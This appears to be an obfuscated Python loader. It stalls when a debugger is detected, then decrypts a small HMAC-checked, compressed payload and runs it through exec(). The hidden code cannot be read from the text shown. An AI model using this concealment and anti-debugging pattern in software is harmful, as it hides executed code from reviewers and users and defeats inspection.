import base64, zlib, json, hashlib, hmac, sys, time
import sys, time
tracef = getattr(sys, 'gettrace', None)
if tracef and tracef():
    time.sleep(5)
_abf6d1_0 = 'n9bSKwyNqelUZJG/9da4+7k/wS+giYVfZNm9WC/1VOrSsoH'
_abf6d1_1 = '/e1heu7dPLywie49Tgh0TB6nQNxR+Vw=='
_pls = [_abf6d1_0, _abf6d1_1]
_87ad15 = [(38174,4822,2),(5490,3449,2),(7636,56327,2),(44207,47869,2),(14682,13102,2),(13382,24785,2),(10469,28063,2),(21033,21839,2),(37520,51400,2),(58541,44487,2),(27861,45452,2),(1774,52849,2),(5499,32922,2),(57373,19892,2),(55938,23824,2),(30550,49182,2),(0,0,0),(0,0,0)]
_2ca6a7 = 'h8gYCw=='
_f0873a = '8Yhgyo011J80V6EQ'
_1fd46c = 'Rx3bp1AdS4I='
_1af5c4 = [0, 1]
_salt = base64.b64decode(_1fd46c)
mhash = hashlib.sha256((__name__ + '|' + repr(globals().get('__file__',''))).encode('utf-8') + _salt).digest()
rbytes = list(mhash)
_perm = list(range(len(_pls)))
for _i in range(len(_perm)-1, 0, -1):
    _j = (rbytes[_i % len(rbytes)] + _i) % (_i + 1)
    _perm[_i], _perm[_j] = _perm[_j], _perm[_i]
_idxs = _1af5c4
_assembled_list = []
_npls = len(_pls)
for _i in range(_npls):
    _pos = None
    try:
        _pos = _idxs.index(_i)
    except Exception:
        _pos = None
    if _pos is not None:
        _assembled_list.append(_pls[_pos])
_assembled = ''.join(_assembled_list)
_e6f8c8 = base64.b64decode(_assembled)
_421174 = 32
_061cd2 = _e6f8c8[:-_421174]
_421174 = _e6f8c8[-_421174:]
_92fb35 = (lambda P: b''.join(((v ^ m).to_bytes(l, 'big') for (v,m,l) in P if l)))(_87ad15)
_hdr = base64.b64decode(_2ca6a7)
_nonce = base64.b64decode(_f0873a)
_km_seed = hashlib.sha256(_92fb35 + _hdr + _nonce).digest()
_km = hashlib.pbkdf2_hmac('sha256', _km_seed, _nonce, 100000, dklen=32)
_blob_seed = hashlib.sha256(_km + b'blob').digest()
_blob_k = hashlib.pbkdf2_hmac('sha256', _blob_seed, _nonce, 20000, dklen=32)
_calc_tag = hmac.new(_blob_k, _061cd2, hashlib.sha256).digest()
if _calc_tag != _421174:
    raise RuntimeError('integrity check failed')
_bs = b''
_ctr = 0
_need = len(_061cd2)
while len(_bs) < _need:
    _bs += hashlib.sha256(_blob_k + _ctr.to_bytes(4, 'little')).digest()
    _ctr += 1
_raw = bytes(a ^ b for a, b in zip(_061cd2, _bs[:_need]))
_dec = zlib.decompress(_raw).decode('utf-8')
_J = json.loads(_dec)
mmap = {}
for _i, _enc in enumerate(_J['strs']):
    _c = base64.b64decode(_enc)
    _seed = hashlib.sha256(_km + b'str' + _i.to_bytes(4, 'little')).digest()
    _ks = b''
    _ctr = 0
    _need = len(_c)
    while len(_ks) < _need:
        _ks += hashlib.sha256(_seed + _ctr.to_bytes(4, 'little')).digest()
        _ctr += 1
    _pt = bytes(a ^ b for a, b in zip(_c, _ks[:_need]))
    mmap[str(_i)] = _pt.decode('utf-8')
globals()['_fb934f'] = mmap
globals()['_4cb658'] = lambda i: globals()['_fb934f'][str(i)]
_x = globals()['_4cb658']
exec(compile(_J['s'], '<obf>', 'exec'), globals())
